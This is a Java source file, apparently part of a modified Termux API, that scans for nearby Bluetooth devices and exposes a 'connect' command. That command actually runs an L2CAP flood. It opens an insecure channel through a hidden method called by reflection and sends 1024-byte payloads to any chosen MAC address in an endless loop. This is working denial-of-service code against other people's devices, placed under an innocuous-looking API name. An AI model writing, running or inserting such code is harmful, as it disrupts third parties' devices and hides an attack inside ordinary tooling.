package com.termux.api;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothSocket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.JsonWriter;
import android.util.Log;

import com.termux.MainActivity;
import com.termux.api.util.ResultReturner;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;

public class BluetoothAPI {

    private static final String TAG = "BluetoothAPI";
    private static boolean scanning = false;
    private static Set<BluetoothDevice> deviceList = new HashSet<>();
    public static boolean unregistered = true;
    public static BluetoothAdapter mBluetoothAdapter;
    private static ConnectThread mConnectThread;

    // Create a BroadcastReceiver for ACTION_FOUND.
    private static final BroadcastReceiver mReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (BluetoothDevice.ACTION_FOUND.equals(action)) {
                // Discovery has found a device. Get the BluetoothDevice object and its info from the Intent.
                BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
                if (device != null) {
                    deviceList.add(device);
                }
            }
        }
    };

    public static void bluetoothStartScanning() {
        IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_FOUND);
        MainActivity.activity.getBaseContext().registerReceiver(mReceiver, filter);
        unregistered = false;
        mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        mBluetoothAdapter.startDiscovery();
    }

    public static void bluetoothStopScanning() {
        if (!unregistered) {
            mBluetoothAdapter.cancelDiscovery();
            MainActivity.activity.getBaseContext().unregisterReceiver(mReceiver);
            unregistered = true;
        }
    }

    static void onReceiveBluetoothScanInfo(TermuxApiReceiver apiReceiver, final Context context, final Intent intent) {
        ResultReturner.returnData(apiReceiver, intent, new ResultReturner.ResultJsonWriter() {
            @Override
            public void writeJson(final JsonWriter out) throws Exception {
                if (!scanning) {
                    // start scanning
                    out.beginObject().name("message").value("Scanning for Bluetooth devices... Run the command again to see results.").endObject();
                    scanning = true;
                    deviceList.clear();
                    bluetoothStartScanning();
                } else {
                    // stop scanning and print results
                    bluetoothStopScanning();
                    out.beginArray();
                    for (BluetoothDevice device : deviceList) {
                        out.beginObject();
                        String deviceName = device.getName();
                        String deviceAddress = device.getAddress();
                        out.name("name").value(deviceName == null ? "null" : deviceName);
                        out.name("address").value(deviceAddress);
                        out.endObject();
                    }
                    out.endArray();
                    scanning = false;
                }
            }
        });
    }

    static void onReceiveBluetoothConnect(TermuxApiReceiver apiReceiver, final Context context, final Intent intent) {
        ResultReturner.returnData(apiReceiver, intent, new ResultReturner.WithStringInput() {
            @Override
            public void writeResult(PrintWriter out) throws Exception {
                JsonWriter writer = new JsonWriter(out);
                writer.setIndent("  ");
                writer.beginObject();

                if (inputString == null || !BluetoothAdapter.checkBluetoothAddress(inputString)) {
                    writer.name("error").value("Invalid MAC address provided.");
                } else {
                    if (mConnectThread != null) {
                        mConnectThread.cancel();
                        mConnectThread = null;
                    }
                    mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
                    BluetoothDevice device = mBluetoothAdapter.getRemoteDevice(inputString);
                    mConnectThread = new ConnectThread(device);
                    mConnectThread.start();
                    writer.name("message").value("L2CAP flood started against " + inputString);
                }
                writer.endObject();
                out.println();
            }
        });
    }

    private static class ConnectThread extends Thread {
        private final BluetoothSocket mmSocket;
        private final BluetoothDevice mmDevice;

        public ConnectThread(BluetoothDevice device) {
            mmDevice = device;
            BluetoothSocket tmp = null;
            try {
                // Use reflection to call the hidden createInsecureL2capChannel method
                Method method = device.getClass().getMethod("createInsecureL2capChannel", int.class);
                // Using a random PSM for connection, as L2CAP doesn't require a specific service UUID
                tmp = (BluetoothSocket) method.invoke(device, 0x1001);
            } catch (Exception e) {
                Log.e(TAG, "Socket's create() method failed", e);
            }
            mmSocket = tmp;
        }

        public void run() {
            // Cancel discovery because it otherwise slows down the connection.
            mBluetoothAdapter.cancelDiscovery();

            try {
                mmSocket.connect();
                Log.d(TAG, "Connected to " + mmDevice.getAddress());
            } catch (IOException connectException) {
                Log.e(TAG, "Connection failed", connectException);
                try {
                    mmSocket.close();
                } catch (IOException closeException) {
                    Log.e(TAG, "Could not close the client socket", closeException);
                }
                return;
            }

            // Start the L2CAP flood
            manageConnectedSocket(mmSocket);
        }

        private void manageConnectedSocket(BluetoothSocket socket) {
            try {
                OutputStream outputStream = socket.getOutputStream();
                // Arbitrary payload size for the flood
                byte[] payload = new byte[1024];
                Log.d(TAG, "Starting L2CAP flood...");
                while (true) {
                    try {
                        outputStream.write(payload);
                        // A small sleep to prevent the app from becoming completely unresponsive,
                        // but still fast enough to be a flood.
                        Thread.sleep(1);
                    } catch (IOException e) {
                        Log.e(TAG, "Write failed, connection lost.", e);
                        break; // Exit loop if connection is lost
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            } catch (IOException e) {
                Log.e(TAG, "Could not get OutputStream", e);
            } finally {
                cancel();
            }
        }

        // Closes the client socket and causes the thread to finish.
        public void cancel() {
            try {
                if (mmSocket != null) {
                    mmSocket.close();
                }
            } catch (IOException e) {
                Log.e(TAG, "Could not close the client socket", e);
            }
        }
    }
}
